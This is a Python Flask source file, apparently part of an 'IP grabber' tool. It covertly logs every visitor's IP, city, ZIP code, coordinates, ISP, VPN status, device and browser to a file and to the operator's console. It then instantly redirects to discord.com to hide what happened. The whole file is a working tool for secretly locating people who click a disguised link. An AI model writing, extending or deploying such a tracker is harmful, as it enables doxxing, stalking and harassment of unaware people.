import json
import os
from datetime import datetime
from flask import Flask, request as freq
from user_agents import parse as ua_parse
from core.intel import get_ip_intel, detect_vpn
from core.display import hit_header, result_line, divider
from colorama import Fore

flask_app = Flask(__name__)
LOG_FILE = "hits.json"


@flask_app.route("/", methods=["GET"])
@flask_app.route("/<path:dummy>", methods=["GET"])
def track(dummy=None):
    real_ip = (
        freq.headers.get("CF-Connecting-IP")
        or freq.headers.get("X-Forwarded-For", "").split(",")[0].strip()
        or freq.remote_addr
    )

    ua_string = freq.headers.get("User-Agent", "unknown")
    ua = ua_parse(ua_string)
    intel = get_ip_intel(real_ip)
    vpn_detected, vpn_reason = detect_vpn(intel)

    hit = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "ip": real_ip,
        "vpn_detected": vpn_detected,
        "vpn_reason": vpn_reason,
        "geo": {
            "country":  intel.get("country", "?"),
            "region":   intel.get("regionName", "?"),
            "city":     intel.get("city", "?"),
            "zip":      intel.get("zip", "?"),
            "lat":      intel.get("lat", "?"),
            "lon":      intel.get("lon", "?"),
            "timezone": intel.get("timezone", "?"),
        },
        "isp": intel.get("isp", "?"),
        "org": intel.get("org", "?"),
        "asn": intel.get("as", "?"),
        "device": {
            "os":        str(ua.os),
            "browser":   str(ua.browser),
            "device":    str(ua.device),
            "is_mobile": ua.is_mobile,
            "is_pc":     ua.is_pc,
            "is_bot":    ua.is_bot,
            "ua_raw":    ua_string,
        },
        "referer":         freq.headers.get("Referer", "none"),
        "accept_language": freq.headers.get("Accept-Language", "?"),
    }

    _save_hit(hit)
    _print_hit(hit)

    return (
        "<html><head>"
        '<meta http-equiv="refresh" content="0;url=https://discord.com">'
        "</head><body></body></html>"
    ), 200


def _save_hit(hit: dict):
    try:
        existing = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                existing = json.load(f)
        existing.append(hit)
        with open(LOG_FILE, "w") as f:
            json.dump(existing, f, indent=2)
    except Exception:
        pass


def _print_hit(hit: dict):
    vpn_label = (
        Fore.RED + "DETECTED  — " + hit["vpn_reason"]
        if hit["vpn_detected"]
        else Fore.GREEN + "NOT DETECTED"
    )
    hit_header(hit["timestamp"])
    result_line("IP",          hit["ip"])
    result_line("VPN",         vpn_label)
    g = hit["geo"]
    result_line("City",        f"{g['city']}, {g['region']}, {g['country']}")
    result_line("ZIP",         g["zip"])
    result_line("Lat / Lon",   f"{g['lat']} / {g['lon']}")
    result_line("Timezone",    g["timezone"])
    result_line("ISP",         hit["isp"])
    result_line("ASN",         hit["asn"])
    d = hit["device"]
    result_line("OS",          d["os"])
    result_line("Browser",     d["browser"])
    result_line("Device",      f"{d['device']} | mobile={d['is_mobile']} pc={d['is_pc']}")
    result_line("Language",    hit["accept_language"])
    result_line("Referer",     hit["referer"])
    divider()


def get_flask_app():
    return flask_app
